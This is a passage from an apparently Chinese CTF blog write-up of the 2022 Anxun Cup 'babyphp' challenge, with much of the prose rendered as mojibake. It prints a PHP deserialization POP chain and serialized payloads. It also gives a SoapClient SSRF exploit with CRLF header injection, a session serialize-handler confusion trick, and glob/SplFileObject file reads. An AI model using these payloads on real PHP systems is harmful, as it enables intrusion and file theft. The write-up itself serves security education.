<!DOCTYPE html>
<html lang="zh-CN">
    
    <head>
    <meta charset="utf-8">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
    <meta name="description" content="2022å®‰æ´µæ¯éƒ¨åˆ†wp" />
    <meta name="hexo-theme-A4" content="v1.8.8" />
    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
    <title>v2ish1yan`s blog</title>

    
        
<link rel="stylesheet" href="/css/highlight/style1.css">

        
<link rel="stylesheet" href="/css/reset.css">

        
<link rel="stylesheet" href="/css/markdown.css">

        
<link rel="stylesheet" href="/css/fonts.css">
 
         <!--æ³¨æ„ï¼šé¦–é¡µæ—¢ä¸æ˜¯postä¹Ÿä¸æ˜¯page-->
        
            
<link rel="stylesheet" href="/css/waline.css">

        
        
        
<link rel="stylesheet" href="/css/ui.css">
 
        
<link rel="stylesheet" href="/css/style.css">


        
            <!--è¿”å›é¡¶éƒ¨css-->
            
<link rel="stylesheet" href="/css/returnToTop.css">

            
<link rel="stylesheet" href="/css/unicons.css">

        
        
            <!--ç›®å½•-->
            
<link rel="stylesheet" href="/css/toc.css">

        
    

    
        
<link rel="stylesheet" href="/css/returnToLastPage.css">

    
    
   
<link rel="stylesheet" href="/css/lightgallery.min.css">


<meta name="generator" content="Hexo 7.1.1"></head>
    
    
    <body>
        
            <div class="left-toc-container">
                <nav id="toc" class="bs-docs-sidebar"></nav>
            </div>
        
        <div class="paper">
            
            
            
            
                <div class="shadow-drop-2-bottom paper-main">
                    


<div class="header">
    <div class="header-container">
        <img style="
        width: 56px;
        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
        <div class="header-content">
            <a class="logo" href="/">v2ish1yan`s blog</a> 
            <span class="description"></span> 
        </div>
        
    </div>
    
   
    <ul class="nav">
        
            
                <li><a href="/">é¦–é¡µ</a></li>
            
        
            
                <li><a href="/list/">æ–‡ç« </a></li>
            
        
            
                <li><a href="/tags/">æ ‡ç­¾</a></li>
            
        
            
                <li><a href="/categories/">åˆ†ç±»</a></li>
            
        
            
                <li><a href="/about/">å…³äº</a></li>
            
        
            
                <li><a href="/friends/">å‹é“¾</a></li>
            
        
    </ul>
</div> 
        
                    
                    

                    
                    
                    
                    <!--è¯´æ˜æ˜¯æ–‡ç« posté¡µé¢-->
                    
                        <div class="post-main">

    
        <div class="post-main-title">
            2022å®‰æ´µæ¯éƒ¨åˆ†wp
        </div>
      
    

    <div class="post-md">
        
            
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#babyphp"><span class="post-toc-text">babyphp</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01"><span class="post-toc-text">0x01</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="post-toc-text">0x02 sessionååºåˆ—åŒ–</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%A6%82%E4%BD%95ssrf"><span class="post-toc-text">å¦‚ä½•ssrf</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#CSRF"><span class="post-toc-text">CSRF</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="post-toc-text">åŸç”Ÿç±»</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#%E6%9E%84%E9%80%A0session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="post-toc-text">æ„é€ sessionååºåˆ—åŒ–</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp"><span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5"><span class="post-toc-text">ç›¸å…³é“¾æ¥</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ezjs"><span class="post-toc-text">ezjs</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#ezupload"><span class="post-toc-text">ezupload</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00"><span class="post-toc-text">0x00</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4"><span class="post-toc-text">0x01 ç»•è¿‡è¿‡æ»¤</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-%E5%8E%9F%E7%94%9F%E7%B1%BB%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="post-toc-text">0x02 åŸç”Ÿç±»è¯»å–æ–‡ä»¶</span></a></li></ol></li></ol>
            
        
        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><ul>
<li>sessionååºåˆ—åŒ–</li>
<li>SSRF</li>
<li>åŸç”Ÿç±»</li>
<li>CSRF</li>
<li>fastdestruct</li>
</ul>
<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>å°±æ˜¯sessionååºåˆ—åŒ–æ­é…åŸç”Ÿç±»è¿›è¡Œssrf</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//something in flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;babyhacker&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;a) &amp;&amp; <span class="variable language_">$this</span>-&gt;a == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">uwant</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;k;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cc</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uwant</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a == <span class="string">&quot;phpinfo&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="variable">$this</span>-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;baby&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;sess&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;sess&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pop&quot;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pop&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>flag.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//flagåœ¨æ ¹ç›®å½•ä¸‹</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$f1ag</span>=<span class="title function_ invoke__">implode</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;F1AG&quot;</span>]= <span class="variable">$f1ag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;only localhost!!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹phpinfoçš„pop</p>
<p>è¿™é‡Œä½¿ç”¨fastdestructæ¥ä½¿destructåœ¨<code>__wakeup</code>å‰æ‰§è¡Œï¼Œå°±èƒ½ç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//something in flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;<span class="comment">//phpinfo</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> C;</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="string">&#x27;0e215962017&#x27;</span>; <span class="comment">//isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)</span></span><br><span class="line"><span class="variable">$a</span>-&gt;b=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;a=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;c=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop=O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:11:&quot;0e215962017&quot;;s:1:&quot;b&quot;;r:2;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;</span><br></pre></td></tr></table></figure>

<h2 id="0x02-sessionååºåˆ—åŒ–"><a href="#0x02-sessionååºåˆ—åŒ–" class="headerlink" title="0x02 sessionååºåˆ—åŒ–"></a>0x02 sessionååºåˆ—åŒ–</h2><h3 id="å¦‚ä½•ssrf"><a href="#å¦‚ä½•ssrf" class="headerlink" title="å¦‚ä½•ssrf"></a>å¦‚ä½•ssrf</h3><p>å¯ä»¥åœ¨ç±»ä¸­çœ‹åˆ°è°ƒç”¨<code>call_user_func(array(reset($_SESSION), $this-&gt;a))</code></p>
<p>è¿™é‡Œcall_user_funcçš„ç”¨æ³•ï¼Œå°±æ˜¯æ‰§è¡Œç±»ä¸­çš„é™æ€å‡½æ•°æˆ–è€…ä¸€ä¸ªå¯¹è±¡çš„æ–¹æ³•</p>
<p>å¦‚æœæˆ‘ä»¬è¦ssrfè®¿é—®flag.php,æˆ‘ä»¬å°±ä½¿ç”¨åŸç”Ÿç±»<code>SoapClient</code>è¯¥å†…ç½®ç±»æœ‰ä¸€ä¸ª <code>__call</code> æ–¹æ³•ï¼Œå½“ <code>__call</code> æ–¹æ³•è¢«è§¦å‘åï¼Œå®ƒå¯ä»¥å‘é€ HTTP å’Œ HTTPS è¯·æ±‚ã€‚æ­£æ˜¯è¿™ä¸ª <code>__call</code> æ–¹æ³•ï¼Œä½¿å¾— SoapClient ç±»å¯ä»¥è¢«æˆ‘ä»¬è¿ç”¨åœ¨ SSRF ä¸­ã€‚SoapClient è¿™ä¸ªç±»ä¹Ÿç®—æ˜¯ç›®å‰è¢«æŒ–æ˜å‡ºæ¥æœ€å¥½ç”¨çš„ä¸€ä¸ªå†…ç½®ç±»ã€‚</p>
<p>åŒæ—¶<code>__call</code>çš„è§¦å‘æ–¹æ³•å°±æ˜¯åœ¨è°ƒç”¨è¿™ä¸ªå¯¹è±¡ä¸å­˜åœ¨çš„ä¸€ä¸ªæ–¹æ³•æ—¶è§¦å‘ï¼Œåˆšå¥½ç¬¦åˆæˆ‘ä»¬çš„éœ€æ±‚</p>
<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p>åœ¨<code>SoapClient</code>é‡Œæœ‰ä¸ª<code>user_agent</code>å‚æ•°ï¼Œå¯ä»¥ä½¿ç”¨æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„headerï¼Œå¯ä»¥ä½¿ç”¨CSRFæ¥è¾¾åˆ°å¤§éƒ¨åˆ†httpå¤´æˆ‘ä»¬å¯æ§</p>
<p>ç»è¿‡æµ‹è¯•ï¼Œè¦æ‰“ssrfæˆåŠŸéœ€è¦åŒæ—¶å­˜åœ¨ä¸¤ä¸ªå¤´</p>
<p>PHPSESSIDè¦ä¸€è‡´</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;X-Forwarded-For: 127.0.0.1&#x27;,</span><br><span class="line">&#x27;Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl&#x27; </span><br></pre></td></tr></table></figure>

<h3 id="åŸç”Ÿç±»"><a href="#åŸç”Ÿç±»" class="headerlink" title="åŸç”Ÿç±»"></a>åŸç”Ÿç±»</h3><p>ssrfåæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">implode</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])));</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä½¿ç”¨phpåŸç”Ÿç±»é…åˆglobåè®®è¿›è¡Œç›®å½•éå†å’Œè¯»å–æ–‡ä»¶å†…å®¹ï¼Œä¾é çš„æ˜¯è§¦å‘ä»–ä»¬çš„<code>__toString()</code>é­”æœ¯æ–¹æ³•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*f*&quot;</span>);<span class="comment">//æŸ¥æ‰¾æ ¹ç›®å½•ä¸‹åå­—å¸¦fçš„æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨?ä½œä¸ºé€šé…ç¬¦</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/flag&#x27;</span>);<span class="comment">//è¯»å–æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<h3 id="æ„é€ sessionååºåˆ—åŒ–"><a href="#æ„é€ sessionååºåˆ—åŒ–" class="headerlink" title="æ„é€ sessionååºåˆ—åŒ–"></a>æ„é€ sessionååºåˆ—åŒ–</h3><p>åœ¨ä»£ç ä¸­å¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;baby&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºsessionæœ‰å¤šç§ä¸åŒçš„åºåˆ—åŒ–å¼•æ“ï¼Œåˆ©ç”¨è¿™ç§ä¸åŒç‚¹ï¼Œæ¥é€ æˆååºåˆ—åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</span><br><span class="line">php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</span><br><span class="line">php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å½“ä¼šè¯è‡ªåŠ¨å¼€å§‹æˆ–è€…é€šè¿‡ session_start() æ‰‹åŠ¨å¼€å§‹çš„æ—¶å€™ï¼Œ PHP å†…éƒ¨ä¼šè°ƒç”¨ä¼šè¯ç®¡ç†å™¨çš„ open å’Œ read å›è°ƒå‡½æ•°ã€‚é€šè¿‡ read å›è°ƒå‡½æ•°è¿”å›çš„ç°æœ‰ä¼šè¯æ•°æ®ï¼ˆä½¿ç”¨ç‰¹æ®Šçš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨ï¼‰ï¼Œ PHP ä¼šè‡ªåŠ¨ååºåˆ—åŒ–æ•°æ®å¹¶ä¸”å¡«å…… $_SESSION è¶…çº§å…¨å±€å˜é‡ã€‚</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®ç¯å¢ƒé»˜è®¤æ˜¯phpå¼•æ“ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨php_serializeå¼•æ“ï¼Œåœ¨å‰é¢åŠ ä¸Š<code>|</code>(ç«–çº¿)</p>
<p>è¿™æ ·ï¼Œåœ¨ä½¿ç”¨phpå¼•æ“çš„æ—¶å€™ï¼Œå°±ä¼šæŠŠ<code>|</code>(ç«–çº¿)åé¢çš„å†…å®¹ååºåˆ—åŒ–ï¼Œå¹¶ä¸”å¡«å…… $_SESSION è¶…çº§å…¨å±€å˜é‡ã€‚</p>
<p>è¿™æ ·å°±å¯ä»¥ä½¿<code>$_SESSION</code>é‡Œæœ‰SoapClientå¯¹è±¡äº†ã€‚</p>
<hr>
<p>å…¶ä»–çŸ¥è¯†</p>
<blockquote>
<p><strong>session_start</strong> å‡½æ•°ä» <strong>PHP7</strong> å¼€å§‹å…è®¸é€šè¿‡å‚æ•°æ¥è®¾ç½® <strong>session</strong> è¿è¡Œæ—¶é…ç½®ã€‚ä¾‹å¦‚ï¼š <code>session_start(array(&#39;serialize_handler&#39; =&gt; &#39;php_serialize&#39;))</code></p>
</blockquote>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>æ„é€ sessionåºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span>=<span class="string">&#x27;http://127.0.0.1:80/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&#x27;</span>; <span class="comment">//è‡ªå·±æ›¿æ¢åŸç”Ÿç±»</span></span><br><span class="line"><span class="variable">$post_data</span>=<span class="string">&#x27;add=111&#x27;</span>;</span><br><span class="line"><span class="variable">$ua</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie: PHPSESSID=kod01dgtpdrd999ms9vqa8l5hl&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,</span><br><span class="line">    <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$ua</span>) . <span class="string">&quot;\r\nContent-Length: &quot;</span> . (<span class="keyword">string</span>) <span class="title function_ invoke__">strlen</span>(<span class="variable">$post_data</span>). <span class="string">&quot;\r\n\r\n&quot;</span> . <span class="variable">$post_data</span>,<span class="comment">//postä¼ å‚çš„å†…å®¹å¯ä»¥åŠ å¯ä¸åŠ </span></span><br><span class="line">    <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;v2ish1yan&#x27;</span><span class="comment">//éšæ„</span></span><br><span class="line">);</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="variable">$options</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A9%3A%22v2ish1yan%22%3Bs%3A8%3A%22location%22%3Bs%3A63%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DSplFileObject%26b%3D%2Ff1111llllllaagg%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A102%3A%22X-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+7%0D%0A%0D%0Aadd%3D111%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<p>payload</p>
<p>å…ˆä¼ è¿™ä¸ª</p>
